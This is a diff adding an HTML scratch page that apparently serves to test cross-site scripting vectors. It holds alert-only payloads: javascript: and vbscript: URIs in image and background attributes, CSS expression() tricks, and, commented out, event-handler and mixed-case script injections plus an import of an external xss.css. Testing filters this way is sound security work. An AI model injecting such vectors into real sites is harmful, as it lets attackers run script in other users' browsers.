@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<!--
+To change this license header, choose License Headers in Project Properties.
+To change this template file, choose Tools | Templates
+and open the template in the editor.
+-->
+<html>
+    <head>
+        <title>TODO supply a title</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style type="text/css">
+            .main{
+                width:1000px;
+                height:1000px;
+            }
+            .box{
+                position:absolute;
+                width:100px;
+                height:100px;
+                background:#ccc;
+                top:200px;
+                left:200px;
+            }
+        </style>
+    </head>
+    <body BACKGROUND="javascript:alert('XSS')">
+        <div>TODO write content</div>
+        <img src="javascript:alert()" title="hahah...jxx" alt="example-slide-3.jpg">
+        <IMG SRC='javascript:alert("anyunix")'>
+        <div STYLE="width:expression(alert('anyunix'));"></div>
+        <IMG DYNSRC="javascript:alert('XSS')">
+        <IMG SRC='vbscript:msgbox("anyunix")'>
+        <IMG STYLE="xss:expr/*XSS*/ession(alert('anyunix'))">
+        <!--<img src="http://s7.51cto.com/wyfs01/M01/10/16/wKioJlHbbUqhAncQAAAQSC9sCcQ933.jpg" onmousemove="alert(163)">-->
+        <!--<p onmousemove="alert(2)">asdfasdf</p>-->
+        <!--<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>-->
+        <!--<sCripT>alert("anyunix")</Script>-->
+        <!--        <div class="main">
+                    <div class="box"><img src="http://fengyun-bar.b0.upaiyun.com/145707470040921.png" alt="" data-zimg="http://fengyun-bar.b0.upaiyun.com/14585534566134820.png"/></div>
+                </div>-->
+        <!--        <script type="text/javascript" src="http://static.ws.kukuplay.com/common/lib/jquery/v1.9.2/jquery-1.9.2.js"></script>
+                <script type="text/javascript" src="../js/echo/imgload.js"></script>-->
+        <script type="text/javascript">
+//            $(function () {
+//                if ($(".box")[0]) {
+//                    var m = $(".box")[0].getBoundingClientRect();
+//                    var b = window.ofset
+//                    console.log(m,b)
+//                }
+//            })
+        </script>
+    </body>
+</html>
